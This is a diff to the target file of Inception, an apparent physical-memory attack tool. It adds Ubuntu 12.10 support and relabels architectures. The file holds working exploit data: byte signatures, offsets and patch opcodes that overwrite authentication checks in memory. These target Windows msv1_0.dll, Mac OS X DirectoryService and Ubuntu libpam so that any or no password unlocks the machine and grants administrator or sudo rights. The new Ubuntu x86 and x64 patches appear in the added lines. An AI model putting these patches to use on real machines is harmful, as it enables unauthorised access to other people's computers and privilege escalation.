@@ -24,7 +24,7 @@ Created on Sep 6, 2011
 #===============================================================================
 # General information
 #===============================================================================
-version = '0.2.0'
+version = '0.2.1'
 url = 'http://breaknenter.org/projects/inception'
 
 #===============================================================================
@@ -153,7 +153,7 @@ targets=[{'OS': 'Windows 8',
                                       'internaloffset': 0x07}]}]},
          {'OS': 'Windows 7',
           'versions': ['SP0', 'SP1'],
-          'architectures': ['x32', 'x64'],
+          'architectures': ['x86', 'x64'],
           'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
           'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], # x64 SP0-SP1
@@ -202,7 +202,7 @@ targets=[{'OS': 'Windows 8',
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Mac OS X',
           'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'],
-          'architectures': ['x32', 'x64'],
+          'architectures': ['x86', 'x64'],
           'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
           'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
           'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
@@ -223,7 +223,7 @@ targets=[{'OS': 'Windows 8',
                          {'offsets': [0xfa7], # 10.7.3 x64
                           'chunks': [{'chunk': 0x0fb6,
                                       'internaloffset': 0x00,
-                                      'patch': 0x31dbffc3, # xor ebx, ebx; inc ebx;
+                                      'patch': 0x31dbffc3, # xor ebx,ebx; inc ebx;
                                       'patchoffset': 0x00},
                                      {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
                                       'internaloffset': 0x0e}]},
@@ -233,8 +233,8 @@ targets=[{'OS': 'Windows 8',
                                       'patch': 0xb001, # mov al,1;
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Ubuntu',
-          'versions': ['11.04','11.10','12.04'],
-          'architectures': ['x32', 'x64'],
+          'versions': ['11.04','11.10','12.04','12.10'],
+          'architectures': ['x86', 'x64'],
           'name': 'libpam unlock/privilege escalation',
           'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
           'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
@@ -242,10 +242,20 @@ targets=[{'OS': 'Windows 8',
                                       'internaloffset': 0x00,
                                       'patch': 0xbf00000000eb,
                                       'patchoffset': 0x00}]},
+                         {'offsets': [0xb46], # 12.10 x86
+                          'chunks': [{'chunk': 0xe8f505000083f81f,
+                                      'internaloffset': 0x00,
+                                      'patch': 0x9031c0, # nop; xor eax,eax
+                                      'patchoffset': 0x05}]},
                          {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
                           'chunks': [{'chunk': 0x83f81f89c574,
                                       'internaloffset': 0x00,
                                       'patch': 0xbd00000000eb,
-                                      'patchoffset': 0x00}]}]}]
+                                      'patchoffset': 0x00}]},
+                         {'offsets': [0x4aa], # 12.10 x64
+                          'chunks': [{'chunk': 0xe80105000083f81f,
+                                      'internaloffset': 0x00,
+                                      'patch': 0x6631c0, # xor eax,eax
+                                      'patchoffset': 0x05}]}]}]
 
 egg = False
